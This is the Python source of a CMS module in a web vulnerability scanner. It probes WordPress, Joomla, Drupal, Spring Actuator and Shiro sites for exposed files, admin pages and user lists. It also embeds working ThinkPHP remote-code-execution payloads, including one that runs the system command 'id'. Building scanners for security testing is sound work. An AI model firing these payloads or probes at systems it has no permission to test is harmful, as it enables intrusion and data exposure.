"""
[新增] CMS 专项扫描模块 — WebVulnScanner v6.0
Author: 火柴 | GitHub: huocai250

针对 WordPress / Joomla / Drupal / Thinkphp / Shiro 等常见框架的专项检测
"""
import logging
from core.logger import C as Colors
log = logging.getLogger("webscan")

import re
from core.scanner import BaseScanner


# WordPress 已知漏洞路径
WP_CHECKS = [
    ("/wp-login.php",           200, "WordPress 登录页面暴露"),
    ("/wp-json/wp/v2/users",    200, "WordPress 用户枚举接口（REST API）"),
    ("/wp-config.php.bak",      200, "WordPress 配置文件备份暴露"),
    ("/wp-content/debug.log",   200, "WordPress debug.log 日志暴露"),
    ("/?author=1",              301, "WordPress 用户名枚举（author参数）"),
    ("/xmlrpc.php",             200, "WordPress xmlrpc 接口（可爆破/DDoS）"),
    ("/wp-json/",               200, "WordPress REST API 开放"),
]

# Joomla 检测
JOOMLA_CHECKS = [
    ("/administrator/",         200, "Joomla 管理后台"),
    ("/configuration.php.bak",  200, "Joomla 配置备份"),
    ("/README.txt",             200, "Joomla README 泄露版本"),
    ("/administrator/manifests/files/joomla.xml", 200, "Joomla 版本信息"),
]

# ThinkPHP 漏洞检测
THINKPHP_CHECKS = [
    ("/?s=index/\\think\\app/invokefunction&function=call_user_func_array"
     "&vars[0]=md5&vars[1][]=ThinkPHP",
     200, "ThinkPHP RCE 漏洞（CVE-2018-20062）"),
    ("/index.php?s=index/think\\app/invokefunction"
     "&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
     200, "ThinkPHP RCE phpinfo"),
    ("/?s=/Index/\\think\\Request/input"
     "&filter[]=system&data=id",
     200, "ThinkPHP 5.x RCE"),
]

# Apache Shiro 检测
SHIRO_CHECK_COOKIE = "rememberMe=1"
SHIRO_SIGNATURE    = "rememberMe=deleteMe"

# Spring Boot Actuator
ACTUATOR_CHECKS = [
    ("/actuator",          200, "Spring Boot Actuator 主端点"),
    ("/actuator/env",      200, "Actuator env — 暴露环境变量和配置"),
    ("/actuator/heapdump", 200, "Actuator heapdump — 可能含内存敏感数据"),
    ("/actuator/logfile",  200, "Actuator logfile — 日志文件读取"),
    ("/actuator/mappings", 200, "Actuator mappings — 暴露所有路由"),
    ("/actuator/beans",    200, "Actuator beans — 暴露应用组件"),
    ("/actuator/shutdown", 200, "Actuator shutdown — 可远程关闭应用！"),
]

# Drupal
DRUPAL_CHECKS = [
    ("/CHANGELOG.txt",    200, "Drupal CHANGELOG 版本泄露"),
    ("/user/register",    200, "Drupal 用户注册页面"),
    ("/?q=node/1",        200, "Drupal 节点访问"),
]


class CMSScanner(BaseScanner):
    def run(self):
        log.info("CMS 专项扫描（WordPress/Joomla/ThinkPHP/Shiro/Actuator）...")
        cms = self._detect_cms()
        log.info(f"  CMS/框架识别: {cms or '未识别'}")

        # 始终检测通用框架漏洞
        self._check_paths(ACTUATOR_CHECKS,  "Spring Actuator")
        self._check_shiro()

        if "wordpress" in cms.lower():
            self._check_paths(WP_CHECKS, "WordPress")
            self._check_wp_users()
        if "joomla" in cms.lower():
            self._check_paths(JOOMLA_CHECKS, "Joomla")
        if "thinkphp" in cms.lower() or "think" in cms.lower():
            self._check_thinkphp()
        if "drupal" in cms.lower():
            self._check_paths(DRUPAL_CHECKS, "Drupal")

        # 不确定时全扫
        if not cms:
            self._check_paths(WP_CHECKS,       "WordPress")
            self._check_paths(JOOMLA_CHECKS,   "Joomla")
            self._check_thinkphp()

    def _detect_cms(self) -> str:
        r = self.get(self.target)
        if not r:
            return ""
        body = (r.text + str(dict(r.headers))).lower()
        sigs = {
            "wordpress": ["wp-content", "wp-includes", "wordpress"],
            "joomla":    ["joomla", "/components/com_"],
            "drupal":    ["drupal", "/sites/default/"],
            "thinkphp":  ["thinkphp", "think\\", "think/"],
            "laravel":   ["laravel_session", "xsrf-token"],
            "django":    ["csrfmiddlewaretoken", "django"],
            "spring":    ["spring", "whitelabel error page"],
        }
        detected = []
        for name, keywords in sigs.items():
            if any(k in body for k in keywords):
                detected.append(name)
        return ", ".join(detected)

    def _check_paths(self, checks, label):
        for path, expected_code, desc in checks:
            url = self.build_url(path)
            r   = self.get(url, allow_redirects=False)
            if not r:
                continue
            if r.status_code == expected_code or \
               (expected_code == 200 and r.status_code in [200, 301, 302]):
                # 软404过滤
                if r.status_code == 200 and len(r.text) < 50:
                    continue
                sev = "HIGH" if any(
                    k in desc for k in ["RCE", "关闭", "heapdump", "env", "配置", "备份"]
                ) else "MEDIUM"
                log.warning(f"[VULN][{label}] {desc}")
                self.result.add(f"CMS/{label}", sev, desc, url=url)

    def _check_wp_users(self):
        """WordPress 用户枚举"""
        r = self.get(self.build_url("/wp-json/wp/v2/users"))
        if r and r.status_code == 200 and '"slug"' in r.text:
            import re as _re
            names = _re.findall(r'"slug"\s*:\s*"([^"]+)"', r.text)
            if names:
                log.warning(f"[VULN][WordPress] 用户名枚举: {', '.join(names[:5])}")
                self.result.add("CMS/WordPress", "HIGH",
                                f"用户名枚举成功: {', '.join(names[:5])}",
                                url=self.build_url("/wp-json/wp/v2/users"))

    def _check_thinkphp(self):
        """ThinkPHP RCE 检测（通过 md5 返回值验证）"""
        for path, _, desc in THINKPHP_CHECKS:
            url = self.target + path
            r   = self.get(url)
            if not r:
                continue
            # ThinkPHP RCE 验证：md5("ThinkPHP") = "4dde9bf5ea3a39b2b8f18ab61e7bff17"
            if "4dde9bf5ea3a39b2b8f18ab61e7bff17" in r.text:
                log.warning(f"[VULN][ThinkPHP] RCE 已确认！")
                self.result.add("CMS/ThinkPHP", "CRITICAL",
                                f"ThinkPHP RCE 漏洞已确认（md5验证通过）",
                                url=url)
                return
            if r.status_code == 200 and len(r.text) > 100:
                self.result.add("CMS/ThinkPHP", "HIGH", desc, url=url)

    def _check_shiro(self):
        """Apache Shiro 特征检测"""
        r = self.get(self.target,
                     headers={"Cookie": SHIRO_CHECK_COOKIE})
        if r and SHIRO_SIGNATURE in r.headers.get("Set-Cookie", ""):
            log.warning("[VULN][Shiro] 检测到 Apache Shiro，存在反序列化漏洞风险")
            self.result.add("框架/Shiro", "HIGH",
                            "检测到 Apache Shiro（rememberMe cookie），"
                            "可能存在反序列化漏洞（CVE-2016-4437等）",
                            url=self.target)
